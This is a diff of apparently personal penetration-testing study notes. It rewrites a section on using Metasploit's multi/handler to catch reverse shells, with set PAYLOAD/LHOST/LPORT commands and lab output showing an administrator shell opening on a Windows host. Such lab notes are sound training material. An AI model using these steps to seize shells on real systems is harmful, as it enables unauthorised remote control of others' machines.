@@ -468,28 +468,46 @@ windows/shell_reverse_tcp
   * Can then be piped into `grep` to search for a specific set of payloads.
 
 ## Metasploit multi/handler
-* Multi/Handler is a superb tool for catching reverse shells.
-* It's essential if you want to use Meterpreter shells, and is the go-to when using staged payloads.
-* It's relatively easy to use:
-* Open Metasploit with msfconsole
-* Type use multi/handler, and press enter
-* We are now primed to start a multi/handler session.
-* Let's take a look at the available options using the options command:
-* There are three options we need to set: payload, LHOST and LPORT.
-* These are all identical to the options we set when generating  shellcode with Msfvenom -- a payload specific to our target, as well as a listening address and port with which we can receive a shell.
-* Note that the LHOST must be specified here, as metasploit will not listen on all network interfaces like netcat or socat will; it must be told a specific address to listen with.
-* set PAYLOAD <payload>
-* set LHOST <listen-address>set LPORT <listen-port>
-* We should now be ready to start the listener!
-* Let's do this by using the exploit -j command. 
-* This tells Metasploit to launch the module, running as a job in the background.
-* You may notice that in the above screenshot, Metasploit is listening on a port under 1024.
-* To do this, Metasploit must be run with sudo permissions.
-* When the staged payload generated in the previous task is run, Metasploit receives the connection, sending the remainder of the payload and giving us a reverse shell:
-* Notice that, because the multi/handler was originally backgrounded, we needed to use sessions 1 to foreground it again.
-* This worked as it was the only session running.
-* Had there been other sessions active, we would have needed to use sessions to see all active sessions, then use sessions <number> to select the appropriate session to foreground.
-* This number would also have been displayed in the line where the shell was opened
+* Superb tool for catching reverse shells.
+1. Open Metasploit with `msfconsole`
+2. Type `use multi/handler`.
+3. Press enter.
+* Now primed to start a multi/handler session.
+* Look at available options using `options` command.
+* These are all identical to the options set when generating shellcode with Msfvenom.
+  * **PAYLOAD** a payload specific to the target.
+      * `set PAYLOAD <payload>`
+  * **LHOST** a listening IP address.
+      * `set LHOST <listen-address>`
+      * LHOST must be specified as metasploit will not listen on all network interfaces like netcat or socat will.
+  * **LPORT** a port with which to receive a shell.
+      * `set LPORT <listen-port>` 
+* Start the listener using `exploit -j` command. 
+  * Launch the module and run as a job in the background.
+* Metasploit must be run with sudo permissions to listen on a port under 1024.
+```
+msf6 exploit(multi/handler) >
+[+] Sending stage (336 bytes) to 10.10.2.57
+```
+* Metasploit catches the connection.
+* Remainder of payload is sent to target.
+```
+[+] Command shell session 1 opened (10.11.12.223:443 -> 10.10.2.57:54226) at 2020-09-12 21:18:35 +0100
+```
+* multi/handler originally backgrounded.
+* Use `sessions 1` to foreground it again.
+```
+msf6 exploit(multi-handler) > session 1
+[+] Starting interation with 1...
+```
+* Reverse shell is established.
+```
+C:\Users\Administrator\Documents>whoami
+whoami
+win-shells\administrator
+```
+* Use `sessions` to see all active sessions.
+  * Use `sessions <number>` to select the appropriate session to foreground.
 
 ## WebShells
 * There are times when we encounter websites that allow us an opportunity to upload, in some way or another, an executable file.
